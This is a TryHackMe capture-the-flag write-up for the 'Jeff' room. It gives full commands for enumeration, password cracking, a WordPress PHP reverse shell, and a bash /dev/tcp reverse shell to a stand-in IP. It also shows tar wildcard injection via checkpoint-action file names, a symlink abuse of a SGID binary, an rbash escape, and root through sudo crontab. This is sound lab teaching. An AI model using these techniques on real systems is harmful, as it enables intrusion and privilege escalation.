# Jeff

## Introduction:

Welcome to my another writeup! In this TryHackMe [Jeff](https://tryhackme.com/room/jeff) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background:

> This machine may take upto 5 minutes to fully deploy.

> Get user.txt and root.txt.

> This is my first ever box, I hope you enjoy it.
> If you find yourself brute forcing SSH, you're doing it wrong.

## Difficulty:

> **Hard**

# Enumeration:

**Rustscan Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# export IP=10.10.xxx.xxx

┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $IP -- -sC -sV -oN rustscan/rustscan1.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg4z+/foDFEWvhoIYbCJR1YFXJSwUz3Tg4eFCje6gUXuRlCbi+AFLKT7Z7YeukAOdGfucg+sDdVG1Uay2MmT0YcWpPaWgJUmeHP3u3fYzwXgc2hwrHag+VTuuRM8zwwyR6gjRFIv1F9zTSPJBCkCWIHulcklArT8OMWLdKVCNK3B8ml92yUIA3HqnsN4DlGOTbYkpKd1G33zYNTXDDPwSi2N29rxWYdfRIJGjGfVT+EXFzccLtK+n+BJqsislTXv7h2Xi2aAJhw66RjBLoopu86ugdayaBb/Wfc1x1vQXAJAnAO02GPKueq/IzFUYGh/dlci7VG1qTz217chshXTqX
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNCLV+aPDHn2ot0aIXSYrRbvARScbRpkGp+hjzAI2iInTc6jgb7GooapeEZOpacn4zFpsI/PR8wwA2QhYXi3aNE=
|   256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx35hakinwovxQnAWprmEBqZNVlj7JjrZO1WxDc/RF/
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Jeffs Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The `rustscan` result indicates that port `22` and `80` is open, which is `SSH` and `HTTP` respectively, and the target is a `Ubuntu` machine.

## HTTP Port:

First, Looking at the site it's an blank page. By viewing the source we find that we need to add `jeff.thm` to the `/etc/hosts` file.

**Add the `MACHINE_IP` to the `/etc/hosts` file:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# nano /etc/hosts           
127.0.0.1   localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.xxx.xxx jeff.thm
```

Then, use `feroxbuster` to enumerate any hidden directory.

**Feroxbuster Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# feroxbuster -u http://jeff.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -t 100 -o ferox1 
[...]
200      GET       94l      160w     1347c http://jeff.thm/assets/style.css
301      GET        7l       12w      178c http://jeff.thm/uploads => http://jeff.thm/uploads/
200      GET       37l      127w     1178c http://jeff.thm/
301      GET        7l       12w      178c http://jeff.thm/admin => http://jeff.thm/admin/
301      GET        7l       12w      178c http://jeff.thm/assets => http://jeff.thm/assets/
403      GET        7l       10w      162c http://jeff.thm/assets/
301      GET        7l       12w      178c http://jeff.thm/backups => http://jeff.thm/backups/
301      GET        7l       12w      178c http://jeff.thm/source_codes => http://jeff.thm/source_codes/
[...]
```

As we can see, we have `/assets/`, `/uploads/`, `/admin/`, `/backups/` and `/source_codes/`.

- `/assets/` directory has a 403 status, which is forbidden.
- `/uploads/` directory seems empty.
- `/admin/` directory seems empty.
- `/backups/` directory seems empty.
- `/source_codes/` directory seems empty.

Next, we can enumerate much deeper with `gobuster`. Such as enumerating any hidden files.

**Gobuster Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# gobuster dir -u http://jeff.thm/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,js,html,txt,css,bak,zip,rar,tar   
[...]
/backup.zip           (Status: 200) [Size: 62753]
```

In the `/backups/` directory, we can see there is a `backup.zip` file. We can download it via `wget`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# wget http://jeff.thm/backups/backup.zip
```

However, the zip file has password protected.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] backup/assets/EnlighterJS.min.css password:
```

We can crack the password with `zip2john` and `john`:

**Zip2john:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# zip2john backup.zip > backup.hash
```

**John The Ripper Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
[...]
[Redacted]  (backup.zip) 
```

Armed with this information, we now can `unzip` the `backup.zip` file.

**Unzip:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# unzip backup.zip
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
  inflating: backup/assets/EnlighterJS.min.css  
  inflating: backup/assets/EnlighterJS.min.js  
  inflating: backup/assets/MooTools-Core-1.6.0-compressed.js  
  inflating: backup/assets/profile.jpg  
  inflating: backup/assets/style.css  
  inflating: backup/index.html       
 extracting: backup/wpadmin.bak
```

The `wpadmin.bak` file seems like it's related to WordPress admin.

**wpbackup.bak:**
```
┌──(root💀nam)-[~/…/thm/ctf/Jeff/backup]
└─# cat wpadmin.bak 
wordpress password is: [Redacted]
```

We found a WordPress user's password.

Then, to find the HTTP port is hosting WordPress or not, we can use `ffuf` to fuzz subdomain.

**FFuF Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://jeff.thm/ -H "HOST: FUZZ.jeff.thm" -fw 12
[...]
wordpress               [Status: 200, Size: 25901, Words: 1212, Lines: 347, Duration: 971ms]
```

We found there is a `wordpress` subdomain. We can add the newly found subdomain to `/etc/hosts` file.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# nano /etc/hosts           
127.0.0.1   localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.xxx.xxx jeff.thm wordpress.jeff.thm
```

Next, we can enumerate the WordPress subdomain with `wpscan`:

**WPscan Result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# wpscan --url http://wordpress.jeff.thm/ -e
[...]
[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[...]
```

We can see there is a `jeff` user.

Now let's login to `jeff` user in http://wordpress.jeff.thm/wp-login.php page:

# Initial Shell:

Once we're in the admin page of WordPress, we can either modify one of the plugin PHP contents, or upload a reverse shell plugin. I'll modify the `Akismet Plugin` to gain a reverse shell.

1. Go to the `Plugin Editor` and change the `wrapper.php` file to a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

2. Then navigate to `Installed Plugins`

3. Setup a `nc` listener and activate the `Akismet Plugin`.

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# nc -lnvp 443                                  
listening on [any] 443 ...
connect to [Redacted] from (UNKNOWN) [10.10.78.140] 41772
Linux Jeff 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 GNU/Linux
 06:21:46 up  1:13,  0 users,  load average: 0.00, 0.22, 1.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Jeff:/$ 
```

# Privilege Escalation

## www-data to backupmgr:

By enumerating the webroot directory, we can see there is a `ftp_backup.php` file, which reveals a username and password.

**ftp_backup.php**
```php
www-data@Jeff:/var/www/html$ cat ftp_backup.php
<?php
/* 
    Todo: I need to finish coding this database backup script.
	  also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "Redacted";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
```

Also, by using `linpeas` bash script, we can see that we're in a docker container.

**Linpeas Result:**
```
[+] Is this a container? .......... Looks like we're in a Docker container
[...]
[+] Hostname, hosts and DNS
Jeff
[...]
172.20.0.6	Jeff
[...]
[+] .sh files in path
/usr/local/bin/docker-entrypoint.sh
[...]
[+] Backup files?
-rw-r--r-- 1 root root 575 May 18  2020 /var/www/html/ftp_backup.php
```

We can use `curl` to login to `172.20.0.1` FTP server:

```
www-data@Jeff:/$ curl -P - 'ftp://backupmgr:[Redacted]@172.20.0.1/'
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files
```

As we can see, we're successfully login as user `backupmgr`, and saw `files` in the FTP server.

Next, we can list the `files` directory via `curl`:

```
www-data@Jeff:/$ curl -P - -u 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
```

However, The `files` directory is empty.

Next, we can test we're able to upload any files or not:

```
www-data@Jeff:/tmp$ echo "test" > test.txt
www-data@Jeff:/tmp$ curl -T test.txt -P - -u 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
[...]
www-data@Jeff:/tmp$ curl -P - -u 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
-rwxr-xr-x    1 1001     1001            5 Jul 19 06:38 test.txt
```

As we can see we're able to upload any files.

At this point, I guess the host has a cronjob that is running `tar` or something, with a wildcard to backup all the files in the `files` directory. We can abuse that to do privilege escalation.

> GTFOBins: https://gtfobins.github.io/gtfobins/tar/

To do so, we can: 
1. Create a bash reverse shell.
2. Create two files: `--checkpoint=1` and `--checkpoint-action=exec=bash revshell.sh`.

This is because the files that we created will be interpreted as options for the `tar` command, to ultimately execute something like a reverse shell.

1. Create a reverse shell:

```
www-data@Jeff:/tmp$ cat << EOF > revshell.sh
> #!/bin/bash
> /bin/bash -i >& /dev/tcp/YOUR_IP/4445 0>&1
> EOF
www-data@Jeff:/tmp$ chmod +x revshell.sh
```

2. Create two files: `--checkpoint=1` and `--checkpoint-action=exec=bash revshell.sh`:

```
www-data@Jeff:/tmp$ echo "" > "--checkpoint=1"
www-data@Jeff:/tmp$ echo "" > "--checkpoint-action=exec=bash revshell.sh"
```

3. Upload those 3 files to the FTP server with `curl`.

```
www-data@Jeff:/tmp$ curl -T revshell.sh -P - -u 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
[...]
www-data@Jeff:/tmp$ curl -T "--checkpoint=1" -P - -su 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
Warning: The file name argument '--checkpoint=1' looks like a flag.
www-data@Jeff:/tmp$ curl -T "--checkpoint-action=exec=bash revshell.sh" -P - -su 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
Warning: The file name argument '--checkpoint-action=exec=bash revshell.sh' 
Warning: looks like a flag.
www-data@Jeff:/tmp$ curl -P - -u 'backupmgr:[Redacted]' ftp://172.20.0.1/files/
-rwxr-xr-x    1 1001     1001            1 Jul 19 06:46 --checkpoint-action=exec=bash revshell.sh
-rwxr-xr-x    1 1001     1001            1 Jul 19 06:46 --checkpoint=1
-rwxr-xr-x    1 1001     1001           60 Jul 19 06:46 revshell.sh
-rwxr-xr-x    1 1001     1001            5 Jul 19 06:38 test.txt
```

Although some errors occurred, those files still successfully uploaded.

4. Setup a `nc` listener and wait for the cronjob to run:

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# nc -lnvp 4445  
listening on [any] 4445 ...
connect to [Redacted] from (UNKNOWN) [10.10.78.140] 54740
[...]
backupmgr@tryharder:~/.ftp/files$ whoami; id; hostname
backupmgr
uid=1001(backupmgr) gid=1001(backupmgr) groups=1001(backupmgr)
tryharder
```

**Proof-of-Concept:**
```
www-data@Jeff:/tmp$ rm *
rm: unrecognized option '--checkpoint=1'
Try 'rm ./'--checkpoint=1'' to remove the file '--checkpoint=1'.
Try 'rm --help' for more information.
```

Turns out there is a script running `tar` command:

**backup.sh**
```
backupmgr@tryharder:~/.scripts$ cat backup.sh
cd /home/backupmgr/.ftp/files
rm /home/backupmgr/.tmp/backup.tar.gz
tar -czvf /home/backupmgr/.tmp/backup.tar.gz *
```

## backupmgr to jeff:

By enumerating manually, we can see that there are 2 interesting directory in `/opt`:

```
backupmgr@tryharder:/opt$ ls -lah
[...]
drwx--x--x  4 root root 4.0K May 11  2020 containerd
drwxrwxrwx  2 jeff jeff 4.0K May 24  2020 systools
```

**systools directory:**
```
backupmgr@tryharder:/opt/systools$ ls -lah
[...]
-rwxrwxrwx 1 root root   108 May 24  2020 message.txt
-rwxr-sr-x 1 jeff pwman  17K May 24  2020 systool
```

**message.txt**
```
backupmgr@tryharder:/opt/systools$ cat message.txt
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```

We can also see the `systool` binary has SGID sticky bit:

**systool**
```
backupmgr@tryharder:/opt/systools$ file systool
systool: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b3c82d2e7f7a8238bc85dabfef348c6ca50557, for GNU/Linux 3.2.0, not stripped
```

```
backupmgr@tryharder:/opt/systools$ ./systool 
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2


Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```

- Option 1 is showing processes in the current environment.
- Option 2 looks like is reflecting the `message.txt`.

We can now investigate the `systool` binary. To do so, we can use `strings` to see it's string.

However, since the `tryharder` host don't have `strings`, we can transfer the binary to our local machine with `base64`.

```
backupmgr@tryharder:/opt/systools$ base64 systool 
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA0BAAAAAAAABAAAAAAAAAAIg7AAAAAAAAAAAAAEAAOAAL
[...]
```

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# nano systool.b64                              
                                                                                                                         
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# base64 -d systool.b64 > systool.elf

┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# chmod +x systool.elf               
                                                                                                                         
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# file systool.elf 
systool.elf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b3c82d2e7f7a8238bc85dabfef348c6ca50557, for GNU/Linux 3.2.0, not stripped
```

```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# strings systool.elf 
[...]
message.txt
Error opening file. Please check that it exists.
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 
/bin/ps aux
[...]
```

We can see that that `ps` command is using the **absolute** path, which is *NOT* exploitable.

However, the `message.txt` is *NOT* using absolute path, it's using the **relative** path. Maybe we can exploit that file.

Also, we can see there is a `jeff.bak` file in `/var/backups`. We can read this using the SGID on `systool`.

```
backupmgr@tryharder:/var/backups$ ls -lah
[...]
-rwxr-x---  1 jeff pwman    43 May 11  2020 jeff.bak
```

Since `systool` is running with SGID (or runs as `pwman`), it can read files that `pwman` can read, like `jeff.bak`.

To do so, the `message.txt` can be changed to a symbolic link to `jeff.bak`.

> Note: the `message.txt` have to be deleted first.

```
backupmgr@tryharder:/opt/systools$ rm message.txt 
backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ls -lah
[...]
lrwxrwxrwx 1 backupmgr backupmgr   21 Jul 19 07:08 message.txt -> /var/backups/jeff.bak
-rwxr-sr-x 1 jeff      pwman      17K May 24  2020 systool
```

Now, we should able to read `jeff.bak` file with `systool`.

```
backupmgr@tryharder:/opt/systools$ ./systool 
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2

Your Password is: [Redacted]
```

Armed with this information, we can now login to `jeff` user.

In the `/etc/passwd`, it shows that `jeff` use is using `rbash`, or restricted bash shell.
```
backupmgr@tryharder:/opt/systools$ cat /etc/passwd
[...]
jeff:x:1000:1000:Jeff:/home/jeff:/bin/rbash
```

To escape `rbash`, we can:

1. Use the `-l` and `-c` option with `su`, and export the `PATH` variable with `/bin:/usr/bin`:
```
backupmgr@tryharder:/opt/systools$ su jeff -lc "/bin/bash"
Password: 
[...]
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in '/usr/bin/dircolors'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
dircolors: command not found
jeff@tryharder:~$ echo $PATH
/home/jeff/.bin
jeff@tryharder:~$ export PATH=$PATH:/bin:/usr/bin
jeff@tryharder:~$ whoami
jeff
```

2. SSH into `jeff` with `-t` option:
```
┌──(root💀nam)-[~/ctf/thm/ctf/Jeff]
└─# ssh jeff@$IP -t "bash --noprofile"
jeff@10.10.78.140's password: 
jeff@tryharder:~$ whoami
jeff
```

**user.txt:**
```
jeff@tryharder:~$ cat user.txt 
THM{Redacted}
```

> Note: MD5 hash it to get the real user flag.

## jeff to root:

By enumerating manually, we can see that `jeff` user can run `crontab` with sudo permission.

```
jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```

We can abuse crontab with sudo to escalate our privilege to root.

> GTFOBins: https://gtfobins.github.io/gtfobins/crontab/#sudo

```
jeff@tryharder:~$ sudo crontab -e
```

In the `vi` editor, we can use command mode to invoke a bash shell:

```
:!/bin/bash
```

# Rooted:

```
root@tryharder:/tmp# whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
```

We're root now! :D

**root.txt:**
```
root@tryharder:~# cat /root/root.txt
THM{Redacted}

Congratz on completing my box. 
Sorry if you hated it, it was my first one :)
```

# Conclusion

**What we've learned:**

1. Directory Enumeration
2. Subdomain Enumeration
3. Cracking Hash
4. WordPress Reverse Shell
5. Privilege Escalation via FTP with `curl`
6. Escaping Docker Container
7. Privilege Escalation via a binary with symbolic link
8. Escaping `rbash`
9. Privilege Escalation via `cronjob` and `tar`